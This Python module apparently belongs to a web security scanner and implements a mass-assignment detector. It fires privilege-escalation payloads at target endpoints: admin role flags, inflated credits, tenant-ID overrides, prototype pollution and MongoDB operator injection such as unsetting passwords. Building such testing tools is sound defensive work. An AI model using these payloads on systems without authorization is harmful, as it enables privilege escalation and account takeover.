"""Mass assignment detection — deep audit.

Expanded from basic privilege field injection to comprehensive mass assignment coverage:

1. Privilege & Property Matrix:
   • Roles: role, user_role, roles, group, groups, user_type, permission_level
   • Flags: is_admin, isAdmin, admin, is_staff, is_superuser, verified, approved
   • Account/Plan: plan, tier, subscription, credits, balance, quota, level
   • Multi-Tenant: org_id, organization_id, company_id, tenant_id, owner_id
   • Permissions: permissions, scopes, privileges, access_level
   • Internal: _id, id, createdAt, updatedAt, __v, internal_note

2. Nested Object Injection:
   • {"user": {"role": "admin"}} — inject via nested model
   • {"profile": {"is_verified": true}} — nested flag injection
   • {"data": {"permissions": ["admin"]}} — nested array injection
   • Deep nesting: {"a": {"b": {"c": {"role": "admin"}}}}

3. Type Confusion:
   • role: "admin" (string) vs role: ["admin"] (array) vs role: {"$gt": ""} (object)
   • is_admin: true (boolean) vs is_admin: "true" (string) vs is_admin: 1 (number)
   • credits: 99999 (number) vs credits: "99999" (string) vs credits: null

4. Prototype Pollution (JavaScript backends):
   • {"__proto__": {"isAdmin": true}}
   • {"constructor": {"prototype": {"role": "admin"}}}
   • {"__proto__": {"role": "admin"}}

5. JSON Merge Patch:
   • Send PATCH with {"$set": {"role": "admin"}} (MongoDB-style)
   • Send {"$unset": {"password": 1}} (remove password requirement)
   • Send {"$push": {"permissions": "admin"}} (append to array)

6. Field Removal:
   • Send request without required fields (password, email verification)
   • Send {"password": null} to remove password
   • Send {"email_verified": true} to skip verification

Evidence oracles:
  • Persistence Oracle: injected field appears in GET response (server stored it)
  • Structural Oracle: JSON response contains the injected key:value pair
  • Differential Oracle: response differs from baseline ONLY by injected field
"""

from __future__ import annotations

import copy
import json
from typing import Any

from titan.core.models import AttackType, Finding, Severity

# ── Privilege-Bearing Fields ─────────────────────────────────────────
PRIVILEGE_FIELDS: list[tuple[str, Any, str]] = [
    # Top-priority admin/role flags
    ("role", "admin", "role=admin"),
    ("is_admin", True, "is_admin=true"),
    ("admin", True, "admin=true"),
    ("isAdmin", True, "isAdmin=true"),
    ("is_staff", True, "is_staff=true"),
    ("is_superuser", True, "is_superuser=true"),
    ("is_superadmin", True, "is_superadmin=true"),
    ("approved", True, "approved=true"),
    ("verified", True, "verified=true"),
    ("is_verified", True, "is_verified=true"),
    ("email_verified", True, "email_verified=true"),
    ("isActive", True, "isActive=true"),
    ("is_active", True, "is_active=true"),
    ("level", 9, "level=9"),
    ("permission_level", "admin", "permission_level=admin"),
    ("access_level", "admin", "access_level=admin"),
    ("permissions", ["admin"], 'permissions=["admin"]'),
    ("roles", ["admin"], 'roles=["admin"]'),
    ("scopes", ["admin", "write", "delete"], 'scopes=["admin","write","delete"]'),
    ("privileges", ["admin"], 'privileges=["admin"]'),
    # Billing & Plan attributes
    ("plan", "enterprise", "plan=enterprise"),
    ("tier", "premium", "tier=premium"),
    ("subscription", "enterprise", "subscription=enterprise"),
    ("credits", 99999, "credits=99999"),
    ("balance", 99999, "balance=99999"),
    ("quota", 99999, "quota=99999"),
    ("seats", 99999, "seats=99999"),
    # Multi-tenant / Ownership
    ("account_id", 1, "account_id=1"),
    ("org_id", 1, "org_id=1"),
    ("organization_id", 1, "organization_id=1"),
    ("company_id", 1, "company_id=1"),
    ("tenant_id", 1, "tenant_id=1"),
    ("owner_id", 1, "owner_id=1"),
    ("workspace_id", 1, "workspace_id=1"),
    # Internal fields
    ("_id", "000000000000000000000001", "_id=injection"),
    ("id", "000000000000000000000001", "id=injection"),
    ("internal_note", "pwned", "internal_note=pwned"),
    ("debug", True, "debug=true"),
    ("test_mode", True, "test_mode=true"),
]

# ── Nested Object Injection Payloads ─────────────────────────────────
NESTED_INJECTIONS: list[tuple[dict, str]] = [
    ({"user": {"role": "admin"}}, "nested_user_admin"),
    ({"user": {"is_admin": True}}, "nested_user_is_admin"),
    ({"profile": {"is_verified": True}}, "nested_profile_verified"),
    ({"data": {"permissions": ["admin"]}}, "nested_data_permissions"),
    ({"account": {"plan": "enterprise"}}, "nested_account_plan"),
    ({"meta": {"role": "admin"}}, "nested_meta_role"),
    ({"a": {"b": {"c": {"role": "admin"}}}}, "deep_nested_admin"),
]

# ── Prototype Pollution Payloads ─────────────────────────────────────
PROTO_POLLUTION: list[tuple[dict, str]] = [
    ({"__proto__": {"isAdmin": True}}, "proto_isAdmin"),
    ({"__proto__": {"role": "admin"}}, "proto_role"),
    ({"constructor": {"prototype": {"role": "admin"}}}, "constructor_prototype"),
    ({"__proto__": {"permissions": ["admin"]}}, "proto_permissions"),
    ({"__proto__": {"is_superuser": True}}, "proto_superuser"),
]

# ── MongoDB Operator Injection ───────────────────────────────────────
MONGO_OPERATORS: list[tuple[dict, str]] = [
    ({"$set": {"role": "admin"}}, "mongo_set_role"),
    ({"$unset": {"password": 1}}, "mongo_unset_password"),
    ({"$push": {"permissions": "admin"}}, "mongo_push_permissions"),
    ({"$addToSet": {"roles": "admin"}}, "mongo_addtoset_roles"),
    ({"$inc": {"level": 100}}, "mongo_inc_level"),
]

# ── Type Confusion Pairs ─────────────────────────────────────────────
TYPE_CONFUSION: list[tuple[str, Any, str]] = [
    ("role", "admin", "string_admin"),
    ("role", ["admin"], "array_admin"),
    ("role", {"$gt": ""}, "object_injection"),
    ("is_admin", True, "boolean_true"),
    ("is_admin", "true", "string_true"),
    ("is_admin", 1, "number_one"),
    ("is_admin", "1", "string_one"),
    ("credits", 99999, "number_credits"),
    ("credits", "99999", "string_credits"),
    ("credits", None, "null_credits"),
]


class MassAssignmentDetector:
    """Production-grade Mass Assignment detector with nested objects, type confusion, and prototype pollution."""

    def __init__(self, payload_smith, fingerprint: dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint

    # ------------------------------------------------------------------
    # PUBLIC ENTRY POINT
    # ------------------------------------------------------------------

    async def scan(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: dict[str, str],
    ) -> list[Finding]:
        # Only state-changing methods can accept mass assignment
        if method.upper() not in ("POST", "PUT", "PATCH"):
            return []

        findings: list[Finding] = []

        # ── Engine 1: Flat Privilege Field Injection ─────────────────
        for field, value, label in PRIVILEGE_FIELDS:
            f = await self._test_mass_assignment(
                context, target, method, url, params, field, value, label
            )
            if f:
                findings.append(f)
                break

        # ── Engine 2: Nested Object Injection ───────────────────────
        if not findings:
            for payload, label in NESTED_INJECTIONS:
                f = await self._test_nested_injection(
                    context, target, method, url, params, payload, label
                )
                if f:
                    findings.append(f)
                    break

        # ── Engine 3: Prototype Pollution ────────────────────────────
        if not findings:
            for payload, label in PROTO_POLLUTION:
                f = await self._test_prototype_pollution(
                    context, target, method, url, params, payload, label
                )
                if f:
                    findings.append(f)
                    break

        # ── Engine 4: MongoDB Operator Injection ─────────────────────
        if not findings:
            for payload, label in MONGO_OPERATORS:
                f = await self._test_mongo_operator(
                    context, target, method, url, params, payload, label
                )
                if f:
                    findings.append(f)
                    break

        # ── Engine 5: Type Confusion ─────────────────────────────────
        if not findings:
            for field, value, label in TYPE_CONFUSION:
                f = await self._test_type_confusion(
                    context, target, method, url, params, field, value, label
                )
                if f:
                    findings.append(f)
                    break

        return findings

    # ------------------------------------------------------------------
    # ENGINE 1 — FLAT PRIVILEGE FIELD INJECTION
    # ------------------------------------------------------------------

    async def _test_mass_assignment(
        self,
        context,
        target: str,
        method: str,
        url: str,
        all_params: dict[str, Any],
        field: str,
        value: Any,
        label: str,
    ) -> Finding | None:
        try:
            is_json, baseline_tree = self._parse_body(all_params)

            baseline_resp = await self._send(context, method, url, baseline_tree, target, is_json)
            baseline_body = await baseline_resp.text()
            baseline_status = baseline_resp.status

            val_str = self._value_to_str(value)
            injected_tree = copy.deepcopy(baseline_tree)
            injected_tree[field] = value if not isinstance(value, str) else val_str

            test_resp = await self._send(context, method, url, injected_tree, target, is_json)
            test_body = await test_resp.text()
            test_status = test_resp.status

            if baseline_status != test_status:
                return None
            if test_body == baseline_body:
                return None

            # Oracle 1: Injected value must appear in test body
            if val_str not in test_body and str(value) not in test_body:
                return None

            # Oracle 2: Value must NOT be in baseline body
            if val_str in baseline_body or str(value) in baseline_body:
                return None

            # Oracle 3: Structural JSON verification
            reflected = False
            try:
                data = json.loads(test_body)
                if self._verify_json_field(data, field, value, val_str):
                    reflected = True
            except Exception:
                pass

            if not reflected:
                return None

            return Finding(
                target=target,
                url=str(getattr(test_resp, "url", None) or url),
                method=method.upper(),
                param=field,
                location="body",
                payload=f"Mass Assignment: {label} accepted",
                attack_type=AttackType.MASS_ASSIGNMENT,
                severity=Severity.HIGH,
                verified=True,
                confidence=0.90,
                status=test_status,
                headers=dict(getattr(test_resp, "headers", {})),
                body=test_body[:2000],
                diffs=[f"massassign:{field}={val_str}_accepted"],
                baseline_body=baseline_body[:2000],
                baseline_status=baseline_status,
                verification_body=test_body[:2000],
                verification_status=test_status,
                metadata={"injected_field": field, "injected_value": val_str},
            )

        except Exception:
            return None

    # ------------------------------------------------------------------
    # ENGINE 2 — NESTED OBJECT INJECTION
    # ------------------------------------------------------------------

    async def _test_nested_injection(
        self,
        context,
        target: str,
        method: str,
        url: str,
        all_params: dict[str, Any],
        nested_payload: dict,
        label: str,
    ) -> Finding | None:
        try:
            is_json, baseline_tree = self._parse_body(all_params)

            baseline_resp = await self._send(context, method, url, baseline_tree, target, is_json)
            baseline_body = await baseline_resp.text()

            # Merge nested payload into baseline
            injected_tree = copy.deepcopy(baseline_tree)
            for key, val in nested_payload.items():
                if key in injected_tree and isinstance(injected_tree[key], dict) and isinstance(val, dict):
                    injected_tree[key].update(val)
                else:
                    injected_tree[key] = val

            test_resp = await self._send(context, method, url, injected_tree, target, is_json)
            test_body = await test_resp.text()

            if test_body == baseline_body:
                return None

            # Check if nested values appear in response
            for key, val in nested_payload.items():
                if isinstance(val, dict):
                    for k2, v2 in val.items():
                        val_str = self._value_to_str(v2)
                        if val_str in test_body and val_str not in baseline_body:
                            return Finding(
                                target=target,
                                url=str(getattr(test_resp, "url", None) or url),
                                method=method.upper(),
                                param=f"{key}.{k2}",
                                location="body",
                                payload=f"Nested mass assignment: {label} accepted",
                                attack_type=AttackType.MASS_ASSIGNMENT,
                                severity=Severity.HIGH,
                                verified=True,
                                confidence=0.88,
                                status=getattr(test_resp, "status", 200),
                                headers=dict(getattr(test_resp, "headers", {})),
                                body=test_body[:2000],
                                diffs=[f"massassign:nested:{key}.{k2}={val_str}"],
                                baseline_body=baseline_body[:2000],
                                baseline_status=getattr(baseline_resp, "status", 200),
                                verification_body=test_body[:2000],
                                verification_status=getattr(test_resp, "status", 200),
                                metadata={"nested_path": f"{key}.{k2}", "value": val_str},
                            )

        except Exception:
            return None
        return None

    # ------------------------------------------------------------------
    # ENGINE 3 — PROTOTYPE POLLUTION
    # ------------------------------------------------------------------

    async def _test_prototype_pollution(
        self,
        context,
        target: str,
        method: str,
        url: str,
        all_params: dict[str, Any],
        payload: dict,
        label: str,
    ) -> Finding | None:
        try:
            is_json, baseline_tree = self._parse_body(all_params)

            baseline_resp = await self._send(context, method, url, baseline_tree, target, is_json)
            baseline_body = await baseline_resp.text()

            injected_tree = copy.deepcopy(baseline_tree)
            injected_tree.update(payload)

            test_resp = await self._send(context, method, url, injected_tree, target, is_json)
            test_body = await test_resp.text()

            if test_body == baseline_body:
                return None

            # Check if __proto__ values leaked into response
            for key, val in payload.get("__proto__", payload.get("constructor", {}).get("prototype", {})).items():
                val_str = self._value_to_str(val)
                if val_str in test_body and val_str not in baseline_body:
                    return Finding(
                        target=target,
                        url=str(getattr(test_resp, "url", None) or url),
                        method=method.upper(),
                        param="__proto__",
                        location="body",
                        payload=f"Prototype pollution: {label} accepted",
                        attack_type=AttackType.PROTO_POLLUTION,
                        severity=Severity.CRITICAL,
                        verified=True,
                        confidence=0.85,
                        status=getattr(test_resp, "status", 200),
                        headers=dict(getattr(test_resp, "headers", {})),
                        body=test_body[:2000],
                        diffs=[f"massassign:proto_pollution:{key}={val_str}"],
                        baseline_body=baseline_body[:2000],
                        baseline_status=getattr(baseline_resp, "status", 200),
                        verification_body=test_body[:2000],
                        verification_status=getattr(test_resp, "status", 200),
                        metadata={"polluted_key": key, "polluted_value": val_str},
                    )

        except Exception:
            return None
        return None

    # ------------------------------------------------------------------
    # ENGINE 4 — MONGODB OPERATOR INJECTION
    # ------------------------------------------------------------------

    async def _test_mongo_operator(
        self,
        context,
        target: str,
        method: str,
        url: str,
        all_params: dict[str, Any],
        payload: dict,
        label: str,
    ) -> Finding | None:
        try:
            is_json, baseline_tree = self._parse_body(all_params)

            baseline_resp = await self._send(context, method, url, baseline_tree, target, is_json)
            baseline_body = await baseline_resp.text()

            # Send the MongoDB operator as the entire body
            test_resp = await self._send(context, method, url, payload, target, True)
            test_body = await test_resp.text()

            if test_body == baseline_body:
                return None

            # Check if the operator was processed (not rejected)
            error_indicators = ["unexpected token", "invalid operator", "bad query", "syntax error"]
            has_error = any(ei in test_body.lower() for ei in error_indicators)

            if not has_error and test_body != baseline_body:
                # Check if role/permissions changed in response
                if "admin" in test_body and "admin" not in baseline_body:
                    return Finding(
                        target=target,
                        url=str(getattr(test_resp, "url", None) or url),
                        method=method.upper(),
                        param=json.dumps(payload)[:100],
                        location="body",
                        payload=f"MongoDB operator injection: {label} accepted",
                        attack_type=AttackType.MASS_ASSIGNMENT,
                        severity=Severity.CRITICAL,
                        verified=True,
                        confidence=0.82,
                        status=getattr(test_resp, "status", 200),
                        headers=dict(getattr(test_resp, "headers", {})),
                        body=test_body[:2000],
                        diffs=[f"massassign:mongo_operator:{label}"],
                        baseline_body=baseline_body[:2000],
                        baseline_status=getattr(baseline_resp, "status", 200),
                        verification_body=test_body[:2000],
                        verification_status=getattr(test_resp, "status", 200),
                        metadata={"operator": label, "payload": payload},
                    )

        except Exception:
            return None
        return None

    # ------------------------------------------------------------------
    # ENGINE 5 — TYPE CONFUSION
    # ------------------------------------------------------------------

    async def _test_type_confusion(
        self,
        context,
        target: str,
        method: str,
        url: str,
        all_params: dict[str, Any],
        field: str,
        value: Any,
        label: str,
    ) -> Finding | None:
        try:
            is_json, baseline_tree = self._parse_body(all_params)

            baseline_resp = await self._send(context, method, url, baseline_tree, target, is_json)
            baseline_body = await baseline_resp.text()

            injected_tree = copy.deepcopy(baseline_tree)
            injected_tree[field] = value

            test_resp = await self._send(context, method, url, injected_tree, target, is_json)
            test_body = await test_resp.text()

            if test_body == baseline_body:
                return None

            # Oracle A: the plain value must NOT already be in the baseline
            # body — if the response always carries e.g. "admin" (nav bar,
            # role list), its presence cannot prove the injected field was
            # honored. Same guard as the flat-injection engine.
            plain_values = self._plain_value_strings(value)
            for pv in plain_values:
                if pv and pv in baseline_body:
                    return None

            # Oracle B: the type-confused value must appear in test body
            val_str = self._value_to_str(value)
            if val_str not in test_body:
                return None

            # Oracle C: JSON-reflection gate — the response must be JSON
            # carrying the field:value pairing. A raw HTML echo of the
            # injected value is not evidence the server honored it.
            reflected = False
            try:
                data = json.loads(test_body)
                if self._verify_json_field(data, field, value, val_str):
                    reflected = True
            except Exception:
                pass
            if not reflected:
                return None

            return Finding(
                    target=target,
                    url=str(getattr(test_resp, "url", None) or url),
                    method=method.upper(),
                    param=field,
                    location="body",
                    payload=f"Type confusion: {field}={label} accepted",
                    attack_type=AttackType.MASS_ASSIGNMENT,
                    severity=Severity.MEDIUM,
                    verified=True,
                    confidence=0.75,
                    status=getattr(test_resp, "status", 200),
                    headers=dict(getattr(test_resp, "headers", {})),
                    body=test_body[:2000],
                    diffs=[f"massassign:type_confusion:{field}={label}"],
                    baseline_body=baseline_body[:2000],
                    baseline_status=getattr(baseline_resp, "status", 200),
                    verification_body=test_body[:2000],
                    verification_status=getattr(test_resp, "status", 200),
                    metadata={"field": field, "type": label, "value": val_str},
                )

        except Exception:
            return None
        return None

    # ------------------------------------------------------------------
    # HELPERS
    # ------------------------------------------------------------------

    def _parse_body(self, params: dict[str, Any]) -> tuple:
        """Parse body params as JSON or dict."""
        is_json = False
        tree = None
        if len(params) == 1:
            first_val = next(iter(params.values()))
            if isinstance(first_val, str) and first_val.startswith("{"):
                try:
                    tree = json.loads(first_val)
                    is_json = True
                except Exception:
                    pass
        if not is_json:
            try:
                tree = dict(params)
            except Exception:
                tree = {}
        return is_json, tree

    async def _send(self, context, method: str, url: str, tree: Any, target: str, is_json: bool):
        """Send request with appropriate content type."""
        if is_json:
            return await context.request.post(
                url, data=json.dumps(tree),
                headers={"Referer": target, "Content-Type": "application/json"},
                timeout=3000,
            )
        return await context.request.post(
            url, data=tree,
            headers={"Referer": target, "Content-Type": "application/json"},
            timeout=3000,
        )

    @staticmethod
    def _value_to_str(value: Any) -> str:
        if value is True:
            return "true"
        if value is False:
            return "false"
        if value is None:
            return "null"
        if isinstance(value, list):
            return json.dumps(value)
        return str(value)

    @staticmethod
    def _plain_value_strings(value: Any) -> list[str]:
        """Extract plain (unserialized) value strings for baseline comparison.

        For a list value (e.g. role=["admin"]) returns each element's string
        ("admin") rather than the serialized form ("[\"admin\"]"), so a
        baseline that always contains "admin" correctly rejects the echo.
        """
        if isinstance(value, list):
            return [MassAssignmentDetector._value_to_str(v) for v in value]
        if isinstance(value, dict):
            return [MassAssignmentDetector._value_to_str(v) for v in value.values()]
        return [MassAssignmentDetector._value_to_str(value)]

    def _verify_json_field(self, data: Any, field: str, raw_val: Any, val_str: str) -> bool:
        """Recursively check if JSON data contains the field:value pair."""
        if isinstance(data, dict):
            if field in data:
                actual = data[field]
                actual_str = self._value_to_str(actual)
                if actual == raw_val or actual_str.lower() == val_str.lower():
                    return True
            for v in data.values():
                if self._verify_json_field(v, field, raw_val, val_str):
                    return True
        elif isinstance(data, list):
            for item in data:
                if self._verify_json_field(item, field, raw_val, val_str):
                    return True
        return False
